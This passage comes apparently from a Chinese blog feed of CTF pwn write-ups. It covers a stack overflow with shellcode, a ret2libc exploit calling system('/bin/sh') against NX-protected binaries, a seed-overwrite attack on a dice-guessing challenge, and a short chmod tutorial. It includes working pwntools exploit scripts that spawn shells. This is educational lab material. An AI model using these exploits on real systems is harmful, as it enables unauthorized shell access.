src="https://s1.ax1x.com/2020/05/23/Yvksv6.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkdUJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkWUH.png" alt=""><br>所以140个字符+ret返回地址即可</p><h3 id="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"><a href="#现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）" class="headerlink" title="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"></a>现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）</h3><p>由于各种玄学问题buf正真的地址不是我想的那样，这里我引用蒸米@阿里聚安全的原话：</p><pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p><p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#level1</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level1"</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> word_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">140</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xffffcff0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)  ——这里启用的话可以进行调试。</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p><h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p><p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p><h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#xctfpwn6 == rop level2</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level2"</span><span class="token punctuation">)</span>systemaddr <span class="token operator">=</span> <span class="token number">0xf7e19d10</span>binshaddr <span class="token operator">=</span> <span class="token number">0x804a024</span>ret <span class="token operator">=</span> <span class="token number">0x804a024</span>   <span class="token comment" spellcheck="true">#要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system("/bin/sh")函数所以system的返回地址可任意。</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>systemaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>连接到端口时脚本为：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token operator">//</span>虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>“level2"<span class="token punctuation">)</span> <span class="token operator">//</span> elf只是一个名字，level2是本地文件。sysaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">//</span> <span class="token punctuation">.</span>symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkrgx<span class="token punctuation">.</span>png<span class="token punctuation">)</span>binshaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">.</span>search 找字符串，汇编代码或者某个数值的地址。!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkw59<span class="token punctuation">.</span>png<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"******"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p><p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF执行权限</title>
      <link href="/2020/04/23/elf-zhi-xing-quan-xian/"/>
      <url>/2020/04/23/elf-zhi-xing-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>使用chmod命令：<br>chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种<br>可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到<br>具有全部权限二进制可理解为  “111”  即 十进制的 “7”，只有读写权限二进制可理解为  “100”  即 十进制的 “4”</p><p>用法：chmod [选项] [文件..]</p><p>权限范围<br>u,User　　　   即文件或目录的拥有者<br>g,Group　　　即文件或目录的所属群组<br>o,Other　　　 除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围<br>a,All　　　　   即全部的用户，包含拥有者，所属群组以及其他用户<br>r　　　　　　 读取权限，数字代号为“4” 即 “100”<br>w　　　　　　写入权限，数字代号为“2” 即 “010”<br>x　　　　　　 执行或切换权限，数字代号为“1” 即 “001”<br>-　　　　　　 不具任何权限，数字代号为“0” 即 “000”</p><p>&lt;权限范围&gt;+&lt;权限&gt;　　       　　  增加指定权限 (chmod u+r file)<br>&lt;权限范围&gt;-&lt;权限&gt;　　  　　　　删除指定权限 (chmod g-rw file)<br>&lt;权限范围&gt;=&lt;权限&gt;　　　　　　 等于指定权限 (chmod o=rwx file)</p><p>例子：<br><img src="https://s1.ax1x.com/2020/05/23/YjqWND.png" alt=""></p><p>将suanfa文件增加可执行</p>]]></content>
      
      
      <categories>
          
          <category> MASS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-gusnum</title>
      <link href="/2020/03/23/xctf-gusnum/"/>
      <url>/2020/03/23/xctf-gusnum/</url>
      
        <content type="html"><![CDATA[<p>1: file<br><img src="https://s1.ax1x.com/2020/05/23/YjOiQA.png" alt="64位"><br>2: checksec<br><img src="https://s1.ax1x.com/2020/05/23/YjOCzd.png" alt="保护全开"><br>3: 运行<br><img src="https://s1.ax1x.com/2020/05/23/YjLxIO.png" alt=""><br>4: ida伪代码<br><img src="https://s1.ax1x.com/2020/05/23/YjOpJe.png" alt=""><br>在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）<br>rand函数调用<br>rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定了一个值，如果有那么它会自动调用srand(seed)一次来初始化它的起始值<br>若之前没有调用srand（seed），那么系统会自动给seed赋初始值，即srand（1）自动调用它一次</p><p>rand（）产生随机数时，如果用srand（seed）播下种子之后，一旦种子相同（下面的getpid方法），产生的随机数将是相同的。当然很多时候刻意让rand（）产生的随机数随机化，用时间作种子 srand（time（NULL）），这样每次运行程序的时间肯定是不相同的，产生的随机数肯定就不一样了。</p><p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p><p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p><p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p><p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0x30303030</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>   </code></pre><p>结果：</p><p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p><p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p><p>确实如此！！！！</p><p>写exp：</p><pre class=" language-python"><code class="language-python">rom pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"***"</span><span class="token punctuation">,</span><span class="token operator">**</span><span class="token operator">*</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">"0000"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
